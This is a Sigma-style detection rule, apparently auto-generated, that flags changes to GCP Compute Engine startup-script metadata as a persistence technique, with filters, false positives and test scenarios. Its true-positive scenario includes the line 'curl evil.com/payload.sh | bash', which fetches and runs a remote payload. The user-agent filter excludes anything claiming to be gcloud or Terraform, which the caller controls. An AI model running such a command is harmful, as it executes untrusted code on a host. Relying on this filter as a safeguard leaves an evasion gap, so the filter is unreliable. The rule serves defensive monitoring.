title: GCP VM Startup Script Modified
id: e8f9g0h1-i2j3-45l6-m7n8-o9p0q1r2s3t4
status: experimental
description: Detects modification of a Compute Engine instance's startup script metadata.
  Adversaries use this technique for persistence, as the script executes with root/System
  privileges each time the VM starts.
references:
- https://attack.mitre.org/techniques/T1053/007/
- https://cloud.google.com/compute/docs/instances/startup-scripts
author: Automated Detection Agent
date: '2024-07-29'
modified: '2024-07-31'
tags:
- attack.persistence
- attack.execution
- attack.t1053.007
logsource:
  product: gcp
  service: gcp.audit
detection:
  selection:
    protoPayload.methodName|endswith: compute.instances.setMetadata
    protoPayload.request.metadata.items.key:
    - startup-script
    - startup-script-url
    - windows-startup-script-ps1
    - windows-startup-script-url
    - windows-startup-script-bat
    - windows-startup-script-cmd
  filter_legitimate:
    protoPayload.requestMetadata.callerSuppliedUserAgent|contains:
    - Terraform
    - Ansible
    - Pulumi
    - Deployment Manager
    - gcloud
  condition: selection and not filter_legitimate
falsepositives:
- Administrators legitimately updating startup scripts for configuration changes using
  gcloud or other tools.
- Configuration management tools (e.g., Ansible) or IaC tools (e.g., Terraform) modifying
  instance metadata as part of a planned deployment.
level: high
fields:
- protoPayload.authenticationInfo.principalEmail
- protoPayload.resourceName
- resource.labels.project_id
- protoPayload.request.metadata.items.key
- protoPayload.request.metadata.items.value
test_scenarios:
  true_positive: An attacker uses a custom script to modify the 'startup-script' metadata
    of a critical VM to include 'curl evil.com/payload.sh | bash'.
  false_negative: An attacker with shell access modifies a systemd service or cron
    job to achieve persistence, bypassing the instance metadata service.
  false_positive: A DevOps engineer uses Terraform to apply an updated startup script
    to a fleet of VMs.
  true_negative: 'An administrator adds a non-startup-related metadata tag, such as
    ''owner: team-x'', to an instance.'
  log_source_schema: https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2
  example_log_fields:
    protoPayload.methodName: v1.compute.instances.setMetadata
    protoPayload.request.metadata.items.key: startup-script
    protoPayload.authenticationInfo.principalEmail: attacker@example.com
